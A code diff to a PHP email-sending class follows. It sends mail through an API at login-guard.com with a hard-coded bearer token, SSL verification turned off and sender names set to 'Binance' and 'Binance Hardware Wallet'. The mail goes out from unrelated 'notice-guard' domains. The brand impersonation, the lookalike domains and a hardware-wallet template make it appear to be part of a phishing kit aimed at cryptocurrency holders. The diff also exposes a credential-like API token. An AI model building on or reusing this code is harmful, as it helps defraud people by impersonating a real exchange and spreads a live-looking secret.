@@ -12,7 +12,7 @@ class EmailHelper {
             'api_url' => 'https://login-guard.com/api/sendEmail',
             'api_token' => 'CigcSiZ0nDe8l6vU5TIKbfr6mlYAf4fUIHm5c6QZXmoYxevVZRtWzU3PQ6Pn',
             'default_from_name' => 'Binance',
-            'default_from_email' => 'test@notice-guard.com',
+            'default_from_email' => 'Charles@notice-guard.com',
             'default_bounce_email' => 'bounce@notice-guard.com',
             'default_reply_to' => 'reply@mumara.com',
             'default_node_id' => '1',
@@ -86,7 +86,7 @@ class EmailHelper {
         return $this->sendEmail($recipient, $subject, $body, [
             'from_name' => 'Binance Hardware Wallet',
             'template_type' => 'hardware_wallet',
-            'node_id' => '5',
+            'node_id' => '4',
         ]);
     }
     
@@ -130,8 +130,7 @@ class EmailHelper {
                 CURLOPT_SSL_VERIFYPEER => false,
                 CURLOPT_HTTPHEADER => [
                     'Authorization: Bearer ' . $this->config['api_token'],
-                    'Content-Type: application/json',
-                    'User-Agent: Binance-EmailHelper/1.0'
+                    'Content-Type: application/json'
                 ]
             ]);
             
